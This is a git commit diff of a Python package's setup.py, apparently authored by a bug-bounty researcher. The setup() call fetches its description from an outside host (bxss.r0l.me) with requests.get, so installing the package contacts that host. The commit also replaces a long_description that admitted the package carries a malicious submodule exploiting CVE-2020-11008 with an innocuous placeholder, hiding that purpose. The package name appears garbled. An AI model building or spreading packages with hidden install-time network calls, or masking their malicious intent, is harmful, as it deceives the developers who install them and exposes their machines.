522c9a5515ba9009d3ec02f108fc8848c95879ca
Rreiss'"sHackerOne/s <72650266+rreissdorker@users.noreply.github.com>
2024-06-30 23:22:58 +0300

    Update setup.py

--- setup.py
+++ setup.py
@@ -4,13 +4,14 @@ import requests
 
 setup(
     name='sp<s>dd',
-    version='2.0.1',
+    version='2.0.2',
     description=requests.get("https://bxss.r0l.me/snykdesc"),
-    long_description='This package contains a mali submodule configuration designed to exploit CVE-2020-11008.',
+    long_description='Some random long description',
     long_description_content_type='text/markdown',
     author='Rotem Reiss',
     author_email='rreiss@wearehackerone.com',
     install_requires=[
         'requests'
     ],
+    license="MIT"
 )
